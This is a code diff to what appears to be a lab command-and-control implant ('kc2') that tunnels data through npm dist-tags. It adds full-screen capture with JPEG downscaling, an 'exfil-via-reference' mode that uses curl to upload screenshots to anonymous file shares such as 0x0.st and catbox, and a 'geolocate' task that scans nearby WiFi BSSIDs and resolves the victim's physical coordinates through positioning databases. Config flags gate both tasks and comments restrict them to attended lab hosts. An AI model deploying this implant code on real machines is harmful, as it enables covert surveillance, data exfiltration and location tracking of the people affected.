@@ -19,6 +19,9 @@ export const LS_MAX_ENTRIES = 200; // keep result tags bounded
 export const PS_MAX_LINES = 40;
 export const FIND_MAX_RESULTS = 100;
 export const FIND_MAX_DEPTH = 6;
+export const GEO_MAX_APS = 20; // keep result tags bounded (~130B/tag)
+export const GEO_MAX_SSID_LEN = 32;
+export const GEO_HTTP_TIMEOUT_MS = 12_000;
 
 const WINDOWS_PS_SCRIPT = `
 $total=[double](Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory;
@@ -46,6 +49,327 @@ $b=New-Object System.Drawing.Bitmap $v.Width,$v.Height;
 $g=[System.Drawing.Graphics]::FromImage($b);
 $g.CopyFromScreen($v.Left,$v.Top,0,0,$b.Size);
 $b.Save($args[0],[System.Drawing.Imaging.ImageFormat]::Png);`;
+// Resizes an image to a target width (aspect preserved) and saves it as JPEG.
+// argv: input, output, width, quality — nothing is interpolated.
+const WINDOWS_RESIZE_SCRIPT = `
+Add-Type -AssemblyName System.Drawing;
+$src=[System.Drawing.Image]::FromFile($args[0]);
+$w=[int]$args[2]; $h=[Math]::Max(1,[int]($src.Height*$w/$src.Width));
+$b=New-Object System.Drawing.Bitmap $w,$h;
+$g=[System.Drawing.Graphics]::FromImage($b);
+$g.InterpolationMode=[System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic;
+$g.DrawImage($src,0,0,$w,$h);
+$ep=New-Object System.Drawing.Imaging.EncoderParameters 1;
+$ep.Param[0]=New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality,[long]$args[3]);
+$codec=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' };
+$b.Save($args[1],$codec,$ep);
+$g.Dispose();$b.Dispose();$src.Dispose();`;
+
+export const DEFAULT_SCREENSHOT_MAX_WIDTH = 1280;
+export const SCREENSHOT_MIN_WIDTH = 240;
+export const SCREENSHOT_WIDTH_RANGE = Object.freeze([160, 7680]);
+const SCREENSHOT_JPEG_QUALITY = 60;
+// The channel moves ~130 payload bytes per dist-tag, so a raw full-screen PNG
+// (often several MiB) would need tens of thousands of tags. Instead the victim
+// walks this width ladder until the JPEG fits the maxFileBytes cap.
+const SCREENSHOT_SCALE_LADDER = Object.freeze([1, 0.75, 0.5, 0.35, 0.25, 0.15]);
+
+function screenshotWidths(startWidth) {
+  const widths = [];
+  for (const f of SCREENSHOT_SCALE_LADDER) {
+    const w = Math.max(SCREENSHOT_MIN_WIDTH, Math.round(startWidth * f));
+    if (!widths.includes(w)) widths.push(w);
+  }
+  return widths;
+}
+
+function validateScreenshotWidth(value) {
+  const w = Number(value);
+  if (!Number.isInteger(w) || w < SCREENSHOT_WIDTH_RANGE[0] || w > SCREENSHOT_WIDTH_RANGE[1]) {
+    throw new Error(
+      `screenshot width must be an integer from ${SCREENSHOT_WIDTH_RANGE[0]} to ${SCREENSHOT_WIDTH_RANGE[1]}`,
+    );
+  }
+  return w;
+}
+
+/**
+ * Write `src` (any image) to `dest` as a JPEG whose largest side is `width`.
+ * Built-in tools only: sips on macOS, ImageMagick on Linux, System.Drawing
+ * on Windows. Throws if the platform has no resizer.
+ */
+function downscaleToJpeg(platform, exec, src, dest, width) {
+  const EXEC_OPTS = { encoding: 'utf8', timeout: 20_000, windowsHide: true };
+  const q = String(SCREENSHOT_JPEG_QUALITY);
+  if (platform === 'darwin') {
+    exec('sips', ['-Z', String(width), '-s', 'format', 'jpeg', '-s', 'formatOptions', q, src, '--out', dest], EXEC_OPTS);
+    return;
+  }
+  if (platform === 'linux') {
+    const errors = [];
+    for (const file of ['convert', 'magick']) {
+      try {
+        exec(file, [src, '-resize', `${width}x${width}`, '-quality', q, dest], EXEC_OPTS);
+        return;
+      } catch (err) {
+        errors.push(`${file}: ${err.message.split('\n')[0]}`);
+      }
+    }
+    throw new Error(`no image resizer found (${errors.join('; ')})`);
+  }
+  if (platform === 'win32') {
+    exec('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', WINDOWS_RESIZE_SCRIPT, src, dest, String(width), q], EXEC_OPTS);
+    return;
+  }
+  throw new Error(`screenshot downscaling is not supported on ${platform}`);
+}
+
+/**
+ * Upload a file to an anonymous, no-key file-sharing endpoint with curl
+ * (`-F file=@path`, the convention used by 0x0.st, tmpfiles.org, catbox,
+ * transfer.sh-style services) and extract the download URL from the
+ * response. Handles both bare-URL responses (0x0.st) and the common JSON
+ * shapes ({link}, {url}, {data:{url}}).
+ */
+export function uploadFileAndExtractUrl(uploadUrl, filePath, exec) {
+  const out = exec(
+    'curl',
+    ['-sS', '-X', 'POST', '-F', `file=@${filePath}`, '--max-time', '30', uploadUrl],
+    { encoding: 'utf8', timeout: 40_000, windowsHide: true },
+  );
+  const text = out.trim();
+  let candidate = text;
+  try {
+    const j = JSON.parse(text);
+    candidate = j?.link ?? j?.url ?? j?.data?.url ?? j?.data?.link ?? '';
+  } catch {
+    // Plain-text response body (e.g. 0x0.st) — already the candidate.
+  }
+  candidate = String(candidate ?? '').trim();
+  if (!/^https?:\/\/\S+$/.test(candidate)) {
+    throw new Error(`upload service returned no usable URL: ${text.slice(0, 120) || '(empty body)'}`);
+  }
+  return candidate;
+}
+
+/**
+ * Walk the width ladder until the downscaled JPEG fits the channel cap.
+ * Returns { path, width, size } of the first fitting file.
+ */
+function fitScreenshotToCap({ platform, exec, src, maxBytes, startWidth, makeTmp }) {
+  const attempts = [];
+  for (const width of screenshotWidths(startWidth)) {
+    const dest = makeTmp(width);
+    try {
+      downscaleToJpeg(platform, exec, src, dest, width);
+    } catch (err) {
+      fs.rmSync(dest, { force: true });
+      throw err; // no resizer tool: smaller widths will not help
+    }
+    const size = fs.statSync(dest).size;
+    if (size <= maxBytes) return { path: dest, width, size };
+    fs.rmSync(dest, { force: true });
+    attempts.push(`${width}px=${size}B`);
+  }
+  throw new Error(
+    `screenshot does not fit the ${maxBytes} byte cap even as a ${SCREENSHOT_MIN_WIDTH}px JPEG ` +
+      `(${attempts.join(', ')}) — raise maxFileBytes`,
+  );
+}
+
+const BSSID_RE = /^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$/;
+const MACOS_AIRPORT_PATH =
+  '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport';
+
+function cleanSsid(value) {
+  return String(value ?? '')
+    .replace(/[\r\n]/g, ' ')
+    .trim()
+    .slice(0, GEO_MAX_SSID_LEN);
+}
+
+/** Legacy `airport -s` (removed in macOS 14.4, kept for older lab hosts). */
+export function parseAirportScan(text) {
+  const aps = [];
+  for (const line of String(text).split('\n')) {
+    const m = /^(.*?)\s+(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})\s+(-?\d+)\s/.exec(line);
+    if (!m || /^\s*SSID\s/.test(line)) continue;
+    aps.push({ bssid: m[2].toLowerCase(), ssid: cleanSsid(m[1]), rssi: Number(m[4]) });
+  }
+  return aps;
+}
+
+/** `system_profiler SPAirPortDataType` — the post-macOS-14.4 fallback. */
+export function parseSystemProfilerWifi(text) {
+  const aps = [];
+  let lastHeader = '';
+  for (const line of String(text).split('\n')) {
+    const header = /^\s{4,}(\S[^:]*):\s*$/.exec(line);
+    if (header) lastHeader = header[1];
+    const m = /BSSID:\s*((?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})\s*$/.exec(line);
+    if (m) {
+      aps.push({ bssid: m[1].toLowerCase(), ssid: cleanSsid(lastHeader), rssi: null });
+    }
+  }
+  return aps;
+}
+
+/** `nmcli -t -f BSSID,SSID,SIGNAL dev wifi list` (backslash-escaped fields). */
+function splitNmcliLine(line) {
+  const parts = [];
+  let cur = '';
+  for (let i = 0; i < line.length; i++) {
+    if (line[i] === '\\' && i + 1 < line.length) {
+      cur += line[i + 1];
+      i++;
+    } else if (line[i] === ':') {
+      parts.push(cur);
+      cur = '';
+    } else {
+      cur += line[i];
+    }
+  }
+  parts.push(cur);
+  return parts;
+}
+
+export function parseNmcliScan(text) {
+  const aps = [];
+  for (const line of String(text).split('\n')) {
+    if (!line.trim()) continue;
+    const [bssid, ssid, signal] = splitNmcliLine(line);
+    if (!BSSID_RE.test(bssid ?? '')) continue;
+    const pct = Number(signal);
+    // nmcli reports 0-100 quality; approximate dBm like iwconfig does
+    const rssi = Number.isFinite(pct) ? Math.round(pct / 2 - 100) : null;
+    aps.push({ bssid: bssid.toLowerCase(), ssid: cleanSsid(ssid), rssi });
+  }
+  return aps;
+}
+
+/** `netsh wlan show networks mode=bssid` on Windows. */
+export function parseNetshScan(text) {
+  const aps = [];
+  let ssid = '';
+  for (const line of String(text).split('\n')) {
+    const s = /^SSID \d+ : (.*)$/.exec(line);
+    if (s) {
+      ssid = cleanSsid(s[1]);
+      continue;
+    }
+    const b = /BSSID \d+\s*:\s*((?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})/.exec(line);
+    if (b) {
+      aps.push({ bssid: b[1].toLowerCase(), ssid, rssi: null });
+      continue;
+    }
+    const sig = /Signal\s*:\s*(\d+)%/.exec(line);
+    if (sig && aps.length > 0 && aps[aps.length - 1].rssi === null) {
+      aps[aps.length - 1].rssi = Math.round(Number(sig[1]) / 2 - 100);
+    }
+  }
+  return aps;
+}
+
+function dedupeAndSortAps(aps) {
+  const seen = new Set();
+  const out = [];
+  for (const ap of aps) {
+    if (seen.has(ap.bssid)) continue;
+    seen.add(ap.bssid);
+    out.push(ap);
+  }
+  out.sort((a, b) => (b.rssi ?? -127) - (a.rssi ?? -127));
+  return out;
+}
+
+/**
+ * Scan visible WiFi access points with OS built-in tools — stage 1 of the
+ * WiFi positioning technique an attacker uses: collect the BSSIDs the
+ * victim's radio can hear, since each BSSID is a worldwide index key in
+ * wardriving-derived location databases.
+ */
+export function scanWifiNetworks(platform, exec) {
+  const EXEC_OPTS = { encoding: 'utf8', timeout: 25_000, windowsHide: true };
+  const errors = [];
+  const attempts = [];
+  if (platform === 'darwin') {
+    attempts.push(
+      [MACOS_AIRPORT_PATH, ['-s'], parseAirportScan],
+      ['system_profiler', ['SPAirPortDataType'], parseSystemProfilerWifi],
+    );
+  } else if (platform === 'linux') {
+    attempts.push(['nmcli', ['-t', '-f', 'BSSID,SSID,SIGNAL', 'dev', 'wifi', 'list'], parseNmcliScan]);
+  } else if (platform === 'win32') {
+    attempts.push(['netsh', ['wlan', 'show', 'networks', 'mode=bssid'], parseNetshScan]);
+  } else {
+    throw new Error(`geolocate is not supported on ${platform}`);
+  }
+  for (const [file, args, parse] of attempts) {
+    try {
+      const aps = dedupeAndSortAps(parse(exec(file, args, EXEC_OPTS)));
+      if (aps.length > 0) return aps;
+      errors.push(`${file}: scan returned no access points (WiFi off, or BSSIDs redacted by OS privacy rules)`);
+    } catch (err) {
+      errors.push(`${file}: ${err.message.split('\n')[0]}`);
+    }
+  }
+  throw new Error(`WiFi scan failed — ${errors.join('; ')}`);
+}
+
+/**
+ * Stage 2: resolve the scanned BSSIDs against a WiFi Positioning System
+ * (WPS) database. Uses the shared Google/Mozilla "geolocate" request shape,
+ * so any MLS-compatible endpoint works (Google Geolocation API, Mozilla
+ * Location Service, or a local mock). The request is sent with curl and a
+ * temp-file body — nothing is interpolated into a shell.
+ */
+export function lookupWpsLocation(serviceUrl, serviceKey, aps, exec) {
+  const body = {
+    considerIp: false,
+    wifiAccessPoints: aps.map((ap) => ({
+      macAddress: ap.bssid,
+      ...(ap.rssi !== null ? { signalStrength: ap.rssi } : {}),
+    })),
+  };
+  const tmp = path.join(
+    fs.realpathSync(os.tmpdir()),
+    `kc2-geo-${process.pid}-${crypto.randomBytes(4).toString('hex')}.json`,
+  );
+  let url = serviceUrl;
+  if (serviceKey) url += `${url.includes('?') ? '&' : '?'}key=${encodeURIComponent(serviceKey)}`;
+  try {
+    fs.writeFileSync(tmp, JSON.stringify(body), { mode: 0o600 });
+    const out = exec(
+      'curl',
+      ['-sS', '-X', 'POST', '-H', 'Content-Type: application/json',
+        '--data-binary', `@${tmp}`, '--max-time', String(Math.ceil(GEO_HTTP_TIMEOUT_MS / 1000)), url],
+      { encoding: 'utf8', timeout: GEO_HTTP_TIMEOUT_MS + 5000, windowsHide: true },
+    );
+    let parsed;
+    try {
+      parsed = JSON.parse(out);
+    } catch {
+      throw new Error(`WPS service returned non-JSON: ${out.slice(0, 120)}`);
+    }
+    if (parsed?.error) {
+      const msg = parsed.error.message ?? JSON.stringify(parsed.error).slice(0, 120);
+      throw new Error(`WPS service error: ${msg}`);
+    }
+    const lat = Number(parsed?.location?.lat);
+    const lng = Number(parsed?.location?.lng);
+    if (!Number.isFinite(lat) || Math.abs(lat) > 90 || !Number.isFinite(lng) || Math.abs(lng) > 180) {
+      throw new Error('WPS service returned no valid coordinates');
+    }
+    const accuracy = Number(parsed?.accuracy);
+    return {
+      lat,
+      lng,
+      accuracyM: Number.isFinite(accuracy) && accuracy > 0 ? Math.round(accuracy) : null,
+    };
+  } finally {
+    fs.rmSync(tmp, { force: true });
+  }
+}
 
 function positiveLimit(value, fallback) {
   const n = Number(value);
@@ -311,20 +635,25 @@ const TASKS = {
 
   /**
    * Capture the whole screen (all displays, not only the desktop window) with
-   * OS built-in tools — no dependencies. The PNG rides back exactly like a
-   * getfile transfer, capped by maxFileBytes. The temp file never touches the
-   * configured filesystem root and is always removed afterwards.
-   * Gated behind the enableScreenshot config flag; run it only on an
-   * attended lab host. On macOS the agent's terminal needs Screen Recording
-   * permission, otherwise screencapture fails or returns a blank image.
+   * OS built-in tools — no dependencies. The image rides back exactly like a
+   * getfile transfer, capped by maxFileBytes. A raw full-screen PNG rarely
+   * fits the ~130-bytes-per-tag channel, so when the PNG exceeds the cap the
+   * handler walks a downscale ladder (sips / ImageMagick / System.Drawing)
+   * and sends a JPEG at the largest width that fits, starting at
+   * screenshotMaxWidth (attacker-overridable per task via args.width).
+   * Temp files never touch the configured filesystem root and are always
+   * removed afterwards. Gated behind the enableScreenshot config flag; run
+   * it only on an attended lab host. On macOS the agent's terminal needs
+   * Screen Recording permission, otherwise screencapture fails or returns a
+   * blank image.
    */
-  screenshot(_args = {}, options = {}) {
+  screenshot(args = {}, options = {}) {
     const platform = options.platform ?? process.platform;
     const exec = options.execFileSync ?? execFileSync;
-    const tmp = path.join(
-      fs.realpathSync(os.tmpdir()),
-      `kc2-shot-${process.pid}-${crypto.randomBytes(4).toString('hex')}.png`,
-    );
+    const tmpDir = fs.realpathSync(os.tmpdir());
+    const stamp = `kc2-shot-${process.pid}-${crypto.randomBytes(4).toString('hex')}`;
+    const tmp = path.join(tmpDir, `${stamp}.png`);
+    const temps = [tmp];
     const EXEC_OPTS = { encoding: 'utf8', timeout: 15_000, windowsHide: true };
     try {
       if (platform === 'darwin') {
@@ -336,9 +665,9 @@ const TASKS = {
           ['gnome-screenshot', ['-f', tmp]],
         ];
         let captured = false;
-        for (const [file, args] of candidates) {
+        for (const [file, toolArgs] of candidates) {
           try {
-            exec(file, args, EXEC_OPTS);
+            exec(file, toolArgs, EXEC_OPTS);
             captured = true;
             break;
           } catch {
@@ -353,22 +682,97 @@ const TASKS = {
       } else {
         throw new Error(`screenshot is not supported on ${platform}`);
       }
-      const st = fs.statSync(tmp);
       const max = positiveLimit(options.maxFileBytes, DEFAULT_MAX_FILE_BYTES);
-      if (st.size > max) {
-        throw new Error(
-          `screenshot too large: ${st.size} bytes (cap ${max}) — raise maxFileBytes; ` +
-            'the dist-tag channel moves ~130 bytes per tag, so full-screen images are slow',
-        );
+      // Exfil-via-reference mode (opt-in): upload the full-resolution PNG to
+      // an anonymous file share and return just the URL — one result tag
+      // instead of hundreds. Falls back to channel transfer on any failure.
+      const uploadUrl = String(options.uploadUrl ?? '').trim();
+      let uploadNote = '';
+      if (uploadUrl) {
+        try {
+          const url = uploadFileAndExtractUrl(uploadUrl, tmp, exec);
+          const st = fs.statSync(tmp);
+          return (
+            `screen captured (${st.size} bytes PNG, full resolution) -> ${url}\n` +
+            'note: anyone with this link can read the image; treat it as expired after the demo'
+          );
+        } catch (err) {
+          let host = uploadUrl;
+          try {
+            host = new URL(uploadUrl).host;
+          } catch {
+            // Keep the raw value in the note.
+          }
+          uploadNote = `upload to ${host} failed (${err.message.split('\n')[0]}); fell back to channel transfer — `;
+        }
       }
-      const data = fs.readFileSync(tmp);
+      let finalPath = tmp;
+      let name = 'screenshot.png';
+      let note = 'PNG';
+      if (fs.statSync(tmp).size > max) {
+        const startWidth = validateScreenshotWidth(
+          args.width ?? options.screenshotMaxWidth ?? DEFAULT_SCREENSHOT_MAX_WIDTH,
+        );
+        const fitted = fitScreenshotToCap({
+          platform,
+          exec,
+          src: tmp,
+          maxBytes: max,
+          startWidth,
+          makeTmp: (w) => {
+            const p = path.join(tmpDir, `${stamp}-w${w}.jpg`);
+            temps.push(p);
+            return p;
+          },
+        });
+        finalPath = fitted.path;
+        name = 'screenshot.jpg';
+        note = `JPEG downscaled to ${fitted.width}px to fit the ${max}-byte channel cap`;
+      }
+      const st = fs.statSync(finalPath);
+      const data = fs.readFileSync(finalPath);
       return {
-        output: `screen captured (${st.size} bytes PNG)`,
-        file: { name: 'screenshot.png', size: st.size, dataB64: data.toString('base64') },
+        output: `screen captured (${uploadNote}${st.size} bytes ${note})`,
+        file: { name, size: st.size, dataB64: data.toString('base64') },
       };
     } finally {
-      fs.rmSync(tmp, { force: true });
+      for (const p of temps) fs.rmSync(p, { force: true });
     }
+  },
+
+  /**
+   * Demonstrate the classic WiFi positioning attack: the agent scans the
+   * BSSIDs its radio can hear (stage 1, reconnaissance), then resolves them
+   * against a WPS database for coordinates with an accuracy estimate
+   * (stage 2) — the same technique real-world implants use to locate hosts
+   * that have no GPS. Stage 2 only runs when the victim operator configures
+   * geolocateServiceUrl (any MLS/Google-compatible endpoint, including a
+   * local mock); without it the task returns the scan-only artifact, which
+   * is itself the teachable output. Gated behind enableGeolocate.
+   */
+  geolocate(_args = {}, options = {}) {
+    const platform = options.platform ?? process.platform;
+    const exec = options.execFileSync ?? execFileSync;
+    const aps = scanWifiNetworks(platform, exec);
+    const used = aps.slice(0, GEO_MAX_APS);
+    const serviceUrl = String(options.geolocateServiceUrl ?? '').trim();
+    const lines = [];
+    if (serviceUrl) {
+      const fix = lookupWpsLocation(serviceUrl, String(options.geolocateServiceKey ?? ''), used, exec);
+      lines.push('geolocate: wifi-scan + WPS database lookup');
+      lines.push(
+        `location: lat=${fix.lat} lng=${fix.lng} accuracyM=${fix.accuracyM ?? 'unknown'}`,
+      );
+      lines.push(`service: ${new URL(serviceUrl).host}`);
+    } else {
+      lines.push('geolocate: wifi-scan (reconnaissance stage — no WPS lookup configured)');
+      lines.push('set geolocateServiceUrl on the victim to resolve coordinates via a WPS database');
+    }
+    lines.push(`access points (${used.length}${aps.length > used.length ? ` of ${aps.length}` : ''}):`);
+    for (const ap of used) {
+      lines.push(`  ${ap.bssid}  rssi=${ap.rssi ?? '?'}  ssid="${ap.ssid || '<hidden>'}"`);
+    }
+    return lines.join('\n');
   },
 
   openurl: (args, options) => runFunTask('openurl', args, options),
@@ -403,6 +807,9 @@ export function runTask(op, args = {}, limits = {}) {
   }
   if (getOpDef(op)?.group === 'screen' && limits.enableScreenshot !== true) {
     return { ok: false, error: `task "${op}" is disabled; set enableScreenshot only on an attended lab host` };
+  }
+  if (op === 'geolocate' && limits.enableGeolocate !== true) {
+    return { ok: false, error: `task "${op}" is disabled; set enableGeolocate only on an attended lab host` };
   }
   try {
     const r = fn(args, limits);
